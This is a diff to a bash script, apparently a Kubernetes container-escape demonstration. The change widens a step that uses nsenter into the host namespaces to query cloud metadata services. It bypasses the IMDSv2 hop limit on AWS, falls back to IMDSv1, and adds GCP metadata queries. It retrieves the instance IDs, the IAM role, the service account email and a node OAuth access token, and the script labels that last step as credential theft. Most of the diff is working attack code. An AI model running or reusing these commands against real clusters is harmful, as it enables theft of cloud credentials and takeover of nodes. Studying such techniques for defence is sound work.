@@ -103,29 +103,60 @@ else
 fi
 echo ""
 
-# ── 2.5 AWS IMDS ────────────────────────────
-echo "> 2.5 - Access AWS Instance Metadata (IMDS)"
-echo "  Using nsenter to reach IMDS from host network namespace..."
+# ── 2.5 Cloud Instance Metadata (AWS IMDS / GCP metadata) ──
+echo "> 2.5 - Access Cloud Instance Metadata"
+echo "  Using nsenter to reach metadata from host network namespace..."
 
-# Try IMDSv2 first (token-based)
+CLOUD_DETECTED=""
+
+# --- Try AWS IMDS (EKS nodes) ---
+# IMDSv2: token-based (hop-limit of 1 blocks containers; nsenter bypasses that)
 IMDS_TOKEN=$(remote_exec "nsenter --target 1 --mount --uts --ipc --net --pid -- curl -s -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' http://169.254.169.254/latest/api/token 2>/dev/null")
 
 if [ -n "$IMDS_TOKEN" ] && [ ${#IMDS_TOKEN} -gt 10 ]; then
-    echo "  IMDSv2 token acquired"
+    CLOUD_DETECTED="aws"
+    echo "  [AWS] IMDSv2 token acquired"
     INSTANCE_ID=$(remote_exec "nsenter --target 1 --mount --uts --ipc --net --pid -- curl -s -H 'X-aws-ec2-metadata-token: ${IMDS_TOKEN}' http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null")
     IAM_ROLE=$(remote_exec "nsenter --target 1 --mount --uts --ipc --net --pid -- curl -s -H 'X-aws-ec2-metadata-token: ${IMDS_TOKEN}' http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null")
+    if [ -n "$INSTANCE_ID" ]; then
+        echo "  [OK] AWS IMDS accessible"
+        echo "  Instance ID: $INSTANCE_ID"
+        echo "  IAM Role:    $IAM_ROLE"
+    fi
 else
-    # Fallback to IMDSv1
-    INSTANCE_ID=$(remote_exec "nsenter --target 1 --mount --uts --ipc --net --pid -- curl -s http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null")
-    IAM_ROLE=$(remote_exec "nsenter --target 1 --mount --uts --ipc --net --pid -- curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null")
+    # IMDSv1 fallback
+    INSTANCE_ID=$(remote_exec "nsenter --target 1 --mount --uts --ipc --net --pid -- curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null")
+    if [ -n "$INSTANCE_ID" ]; then
+        CLOUD_DETECTED="aws"
+        IAM_ROLE=$(remote_exec "nsenter --target 1 --mount --uts --ipc --net --pid -- curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null")
+        echo "  [OK] AWS IMDS (v1) accessible"
+        echo "  Instance ID: $INSTANCE_ID"
+        echo "  IAM Role:    $IAM_ROLE"
+    fi
 fi
 
-if [ -n "$INSTANCE_ID" ]; then
-    echo "  [OK] IMDS accessible"
-    echo "  Instance ID: $INSTANCE_ID"
-    echo "  IAM Role:    $IAM_ROLE"
-else
-    echo "  [--] IMDS not reachable (IMDSv2 hop limit may block containers)"
+# --- Try GCP metadata (GKE nodes) if AWS IMDS did not respond ---
+if [ -z "$CLOUD_DETECTED" ]; then
+    echo "  [GCP] Trying GCP metadata endpoint (metadata.google.internal)..."
+    GCP_PROJECT=$(remote_exec "nsenter --target 1 --mount --uts --ipc --net --pid -- curl -s --connect-timeout 3 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/project/project-id 2>/dev/null")
+    if [ -n "$GCP_PROJECT" ]; then
+        CLOUD_DETECTED="gcp"
+        GCP_INSTANCE=$(remote_exec "nsenter --target 1 --mount --uts --ipc --net --pid -- curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/id 2>/dev/null")
+        GCP_SA_EMAIL=$(remote_exec "nsenter --target 1 --mount --uts --ipc --net --pid -- curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email 2>/dev/null")
+        GCP_TOKEN_JSON=$(remote_exec "nsenter --target 1 --mount --uts --ipc --net --pid -- curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' 2>/dev/null")
+        GCP_TOKEN_PREVIEW=$(echo "$GCP_TOKEN_JSON" | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4 | cut -c1-20)
+        echo "  [OK] GCP metadata accessible — node service account token retrieved!"
+        echo "  Project ID:    $GCP_PROJECT"
+        echo "  Instance ID:   $GCP_INSTANCE"
+        echo "  Service Acct:  $GCP_SA_EMAIL"
+        if [ -n "$GCP_TOKEN_PREVIEW" ]; then
+            echo "  OAuth token:   ${GCP_TOKEN_PREVIEW}... (truncated — credential theft!)"
+        fi
+    fi
+fi
+
+if [ -z "$CLOUD_DETECTED" ]; then
+    echo "  [--] No cloud metadata reachable (on-prem node or hop-limit blocked)"
 fi
 echo ""
 
@@ -225,5 +256,6 @@ echo "    * hostPID    -> access host process tree"
 echo "    * hostPath / -> read/write host filesystem"
 echo "    * privileged -> nsenter to host namespaces"
 echo "    * nsenter    -> run commands as root on node"
+echo "    * metadata   -> cloud credentials via IMDS (AWS) or metadata.google.internal (GKE)"
 echo "================================================"
 echo ""
